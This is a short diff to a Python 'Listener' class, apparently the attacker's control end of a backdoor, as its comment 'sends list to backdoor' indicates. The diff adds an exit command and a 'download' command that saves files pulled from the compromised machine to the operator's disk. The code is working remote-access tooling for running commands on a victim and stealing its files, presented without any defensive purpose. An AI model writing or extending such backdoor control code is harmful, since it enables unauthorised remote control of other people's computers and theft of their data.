@@ -28,13 +28,28 @@ class Listener:
 
     def execute_remotely(self, command):
         self.reliable_send(command)
-        return self.reliable_receive()  # receives data of 1024 bytes 
+
+        if command[0] == "exit":
+            self.connection.close()
+            exit()
+
+        return self.reliable_receive()  # receives data of 1024 bytes
+
+    def write_file(self, path, content):
+        with open(path, "wb") as file:
+            file.write(content)
+            return "[+] Download successful."
 
     def run(self):
         while True:
             command = raw_input(">> ")
+            command = command.split(" ")
             # command = input(">> ") Use this for python3 implementation
-            result = self.execute_remotely(command)
+            result = self.execute_remotely(command)  # sends list to backdoor
+
+            if command[0] == "download":
+                result = self.write_file(command[1], result)
+
             print(result)
 
 
